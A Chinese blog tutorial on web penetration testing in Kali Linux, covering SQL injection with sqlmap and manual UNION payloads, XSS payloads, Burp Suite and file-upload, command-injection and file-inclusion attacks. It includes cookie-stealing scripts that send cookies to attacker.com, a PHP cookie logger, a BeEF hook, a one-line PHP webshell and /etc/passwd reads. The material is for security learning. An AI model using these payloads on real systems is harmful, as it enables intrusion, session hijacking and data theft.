---
title: Web 渗透测试：SQL 注入与 XSS 实战
slug: kali-web渗透sql注入xss-k7g8h
date: 2026-08-30
visibility: public
tags: Kali Linux, Web安全, SQL注入, XSS, 渗透测试, 教程
---

# Web 渗透测试：SQL 注入与 XSS 实战

Web 应用是现代信息系统的核心，也是攻击者最常攻击的目标。OWASP Top 10 中，SQL 注入和 XSS 长年霸榜。本文介绍如何在 Kali Linux 下进行 Web 渗透测试。

## 一、Web 渗透测试流程

```
1. 信息收集 → 识别 Web 技术栈
2. 漏洞扫描 → 自动化扫描 + 手动验证
3. 漏洞利用 → SQL 注入、XSS、文件上传等
4. 后渗透 → 通过 Web 漏洞获取系统权限
```

## 二、Web 信息收集

### 1. 技术栈识别

```bash
# 识别 Web 技术
whatweb http://example.com

# HTTP 头分析
curl -I http://example.com

# CMS 识别
cmsmap -u http://example.com
wpscan --url http://example.com  # WordPress
joomscan --url http://example.com  # Joomla
```

### 2. 目录扫描

```bash
# Dirb - 经典目录扫描
dirb http://example.com

# Gobuster - 快速目录扫描
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# FFuF - 最快的模糊测试工具
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 扫描扩展
ffuf -u http://example.com/FUZZ -w words.txt -e .php,.asp,.txt,.bak
```

### 3. 子域名扫描

```bash
# 子域名爆破
gobuster dns -d example.com -w subdomains.txt

# 使用 Sublist3r
sublist3r -d example.com
```

## 三、SQL 注入

### 1. SQL 注入原理

用户输入未经过滤，直接拼接到 SQL 查询中，导致攻击者可以执行任意 SQL 语句。

```sql
-- 正常查询
SELECT * FROM users WHERE username = 'admin' AND password = '123456';

-- 注入后（万能密码）
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';
-- 注入 ' OR 1=1 -- 后：
SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'anything';
```

### 2. SQL 注入类型

| 类型 | 说明 | 检测方法 |
|------|------|---------|
| 联合查询 | UNION SELECT 合并结果 | ORDER BY 判断列数 |
| 报错注入 | 利用数据库报错回显 | 单引号触发错误 |
| 布尔盲注 | 无回显，靠真假判断 | AND 1=1 / AND 1=2 |
| 时间盲注 | 无回显，靠延迟判断 | IF + SLEEP |
| 堆叠注入 | 执行多条 SQL 语句 | 分号分隔 |

### 3. SQLMap 自动化注入

SQLMap 是最强大的 SQL 注入工具，自动化程度极高：

```bash
# 基础检测
sqlmap -u "http://example.com/page.php?id=1"

# POST 请求注入
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123"

# 指定参数注入
sqlmap -u "http://example.com/page.php?id=1&name=test" -p id

# 使用 Cookie
sqlmap -u "http://example.com/page.php?id=1" --cookie="session=abc123"

# 数据库指纹识别
sqlmap -u "http://example.com/page.php?id=1" --banner

# 列出所有数据库
sqlmap -u "http://example.com/page.php?id=1" --dbs

# 列出指定数据库的表
sqlmap -u "http://example.com/page.php?id=1" -D mydb --tables

# dump 表数据
sqlmap -u "http://example.com/page.php?id=1" -D mydb -T users --dump

# 获取 os-shell（需要 DBA 权限）
sqlmap -u "http://example.com/page.php?id=1" --os-shell
```

### 4. SQLMap 高级技巧

```bash
# 绕过 WAF
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://example.com/page.php?id=1" --tamper=between,randomcase

# 指定数据库类型
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql

# 指定注入技术
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUSTQ
# B=布尔盲注, E=报错, U=联合, S=堆叠, T=时间, Q=内联查询

# Level 和 Risk 调高（检测更多注入点）
sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3

# 从 Burp 请求文件导入
sqlmap -r request.txt --batch
```

### 5. 手动 SQL 注入示例

```sql
-- 1. 判断是否存在注入
http://example.com/news.php?id=1'
-- 如果报错，可能存在注入

-- 2. 判断列数
http://example.com/news.php?id=1 ORDER BY 1-- -
http://example.com/news.php?id=1 ORDER BY 2-- -
http://example.com/news.php?id=1 ORDER BY 3-- -  -- 如果报错，说明有 2 列

-- 3. 联合查询
http://example.com/news.php?id=-1 UNION SELECT 1,2-- -
-- 查看哪些位置可以回显

-- 4. 提取数据
http://example.com/news.php?id=-1 UNION SELECT database(),version()-- -
http://example.com/news.php?id=-1 UNION SELECT table_name,2 FROM information_schema.tables-- -
http://example.com/news.php?id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
http://example.com/news.php?id=-1 UNION SELECT username,password FROM users-- -
```

## 四、XSS（跨站脚本攻击）

### 1. XSS 类型

| 类型 | 说明 | 危害 |
|------|------|------|
| 反射型 | URL 参数中注入，需诱导点击 | 盗取 Cookie |
| 存储型 | 注入内容存入数据库 | 持久化攻击所有访问者 |
| DOM 型 | 前端 JS 代码漏洞 | 不经过服务器 |

### 2. XSS 检测 Payload

```html
<!-- 基础测试 -->
<script>alert('XSS')</script>

<!-- 绕过过滤 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

<!-- 事件触发 -->
<input onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
```

### 3. XSS 利用 - Cookie 盗取

```html
<!-- 攻击者搭建接收服务器，注入如下 Payload -->
<script>
  new Image().src="http://attacker.com/log.php?cookie="+document.cookie;
</script>

<!-- 更隐蔽的写法 -->
<script>fetch('http://attacker.com/c?'+document.cookie)</script>
```

```php
// 攻击者接收端 log.php
<?php
  $cookie = $_GET['cookie'];
  $log = fopen("cookies.txt", "a");
  fwrite($log, date('Y-m-d H:i:s') . " - " . $cookie . "\n");
  fclose($log);
?>
```

### 4. BeEF 框架

BeEF（Browser Exploitation Framework）是 XSS 利利用框架：

```bash
# 启动 BeEF
cd /usr/share/beef-xss
./beef

# 默认界面
# http://127.0.0.1:3000/ui/panel
# 默认账号：beef / beef

# 注入 Hook JS（将此代码注入存在 XSS 的页面）
<script src="http://attacker-ip:3000/hook.js"></script>
```

## 五、Burp Suite 实战

Burp Suite 是 Web 渗透测试最核心的工具：

### 1. 配置代理

```
1. Burp Suite → Proxy → Options
2. 设置代理地址：127.0.0.1:8080
3. 浏览器配置代理：127.0.0.1:8080
4. 安装 Burp 证书（HTTPS 抓包需要）
```

### 2. 核心功能

| 功能 | 说明 |
|------|------|
| Proxy | 代理抓包，拦截修改请求 |
| Repeater | 重放请求，手动修改测试 |
| Intruder | 自动化模糊测试、暴力破解 |
| Scanner | 自动漏洞扫描（专业版） |
| Decoder | 编码/解码工具 |
| Comparer | 对比两个请求/响应 |

### 3. Intruder 暴力破解

```
1. 抓取登录请求发送到 Intruder
2. 标记需要爆破的参数（如 password）
3. 选择攻击类型：Sniper（单参数）
4. 加载密码字典
5. Start attack
6. 按响应长度或状态码排序找成功结果
```

## 六、其他 Web 漏洞

### 文件上传漏洞

```bash
# 上传 PHP Webshell
<?php system($_GET['cmd']); ?>

# 绕过后缀检查
shell.php5    # Apache 可能解析
shell.phtml   # PHP 解析
shell.php.jpg # 00 截断绕过
```

### 命令注入

```bash
# 测试点
; ls
| cat /etc/passwd
&& whoami
$(whoami)
`whoami`
```

### 文件包含

```bash
# 本地文件包含 (LFI)
http://example.com/page.php?file=../../../../etc/passwd

# 远程文件包含 (RFI)
http://example.com/page.php?file=http://attacker.com/shell.txt
```

## 七、实战流程示例

```
1. whatweb 识别目标技术栈
2. gobuster/ffuf 扫描目录和文件
3. Burp Suite 代理抓包分析
4. sqlmap 检测 SQL 注入
5. 手动测试 XSS Payload
6. Burp Intruder 暴力破解登录
7. 发现漏洞后编写报告
```

## 安全提醒

> Web 渗透测试必须在授权范围内进行。SQL 注入和 XSS 测试可能修改或删除数据，请谨慎操作。建议在 DVWA、WebGoat 或 OWASP Juice Shop 等练习平台上学习。

## 小结

- SQLMap 是 SQL 注入自动化利器，`--tamper` 可绕过 WAF
- XSS 分三种类型，存储型危害最大
- Burp Suite 是 Web 渗透的核心工具，Repeater 最常用
- 目录扫描用 ffuf，速度快且灵活
- 手动验证比自动化扫描更重要

> 下一篇我们将学习无线网络安全测试，包括 Wi-Fi 破解和蓝牙安全。
